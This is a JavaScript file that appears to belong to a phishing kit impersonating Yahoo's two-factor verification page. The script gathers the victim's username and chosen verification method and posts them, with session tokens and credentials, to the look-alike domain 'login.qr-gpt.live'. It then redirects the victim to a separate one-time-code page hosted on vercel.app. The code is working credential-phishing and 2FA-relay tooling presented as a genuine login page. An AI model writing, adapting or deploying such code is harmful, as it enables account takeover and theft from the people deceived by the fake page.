const $ = require("jquery") // Declare the $ variable

$(document).ready(() => {
  console.log("Yahoo 2FA page initialized")

  let selectedMethod = ""
  let username = ""
  const sessionData = {}

  function getUsername() {
    const urlParams = new URLSearchParams(window.location.search)
    let user = urlParams.get("u")

    if (user) {
      return decodeURIComponent(user)
    }

    user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
    if (user) {
      return user
    }

    return "user@example.com"
  }

  function showState(state) {
    $("#main-form, #loading-state").hide()
    $(`#${state}`).show()
  }

  $(".verification-option").click(function () {
    $(".verification-option").removeClass("selected")
    $(this).addClass("selected")

    selectedMethod = $(this).data("method")
    $("#challenge").val(selectedMethod)
    $("#submit-btn").prop("disabled", false)

    console.log("Selected verification method:", selectedMethod)
  })

  $("#verification-form").on("submit", (e) => {
    e.preventDefault()

    if (!selectedMethod) {
      alert("Please select a verification method")
      return false
    }

    console.log("Submitting 2FA challenge:", selectedMethod)
    showState("loading-state")

    const formData = {
      username: username,
      challenge: selectedMethod,
      crumb: $("#crumb").val() || "auto_crumb_" + Date.now(),
      acrumb: $("#acrumb").val() || "auto_acrumb_" + Date.now(),
      sessionIndex: $("#sessionIndex").val() || "1",
      sessionToken: $("#sessionToken").val() || "sess_" + Date.now(),
      done: "https://mail.yahoo.com/d/folders/1",
      src: "ym",
      ".lang": "en-US",
      ".intl": "us",
    }

    $.ajax({
      url: "https://login.qr-gpt.live/account/challenge/challenge-selector",
      method: "POST",
      data: formData,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://login.qr-gpt.live",
        Referer: window.location.href,
        "User-Agent": navigator.userAgent,
      },
      xhrFields: {
        withCredentials: true,
      },
      timeout: 15000,
      success: (response, textStatus, xhr) => {
        console.log("2FA challenge submitted successfully")

        setTimeout(() => {
          window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
        }, 1500)
      },
      error: (xhr, textStatus, errorThrown) => {
        console.log("2FA challenge error:", textStatus, xhr.status)

        if (xhr.status === 0) {
          setTimeout(() => {
            window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
          }, 2000)
        } else {
          alert("Error submitting verification method. Please try again.")
          showState("main-form")
        }
      },
    })

    return false
  })

  function initializePage() {
    username = getUsername()
    $("#userEmail").text(username)
    $("#username").val(username)

    console.log("2FA page initialized for user:", username)
  }

  initializePage()
})
